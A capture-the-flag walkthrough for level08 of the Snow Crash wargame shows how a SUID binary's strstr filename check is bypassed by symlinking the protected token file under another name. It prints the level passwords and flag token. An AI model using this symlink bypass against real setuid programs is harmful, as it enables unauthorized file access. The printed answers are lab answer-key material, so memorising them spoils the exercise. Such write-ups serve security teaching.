# Level08

Login as `level08`

```bash
┌──$ [~/42/2021/snow-crash]
└─>  ssh 192.168.1.64 -p 4242 -l level08
level08@192.168.1.64's password: fiumuikeil55xe9cu4dood66h
```

There is a `SUID` executable and a token file in the home directory:

```bash
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
level08@SnowCrash:~$ ./level08
./level08 [file to read]
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
level08@SnowCrash:~$ cat token
cat: token: Permission denied
```

It seems that `token` can't be read by `level08` or `cat`

As in the previous level, `ltrace` and `radare2` can be used to intercept the dynamic library and system calls executed by the program level08:

```bash
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token") = "token"
printf("You may not access '%s'\n", "token"You may not access 'token') = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

To prevent the user from reading the token file with this setUID, an strstr check is made on the filename given as parameter.

`strstr` function locate a substring needle in the string `haystack`.

So we can deduct that if the passed file has token string in name, it exists.

To bypass it, we can create a symbolic link to our token file with a different name and execute level08 with it to get thte password to log into flag08:

```bash
level08@SnowCrash:~$ ln -s $(realpath token) /tmp/symlink
level08@SnowCrash:~$ ./level08 /tmp/symlink
quif5eloekouj29ke0vouxean
```

Finally log as `flag08` and get the flag:

```bash
level08@SnowCrash:~$ su flag08
Password: quif5eloekouj29ke0vouxean
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```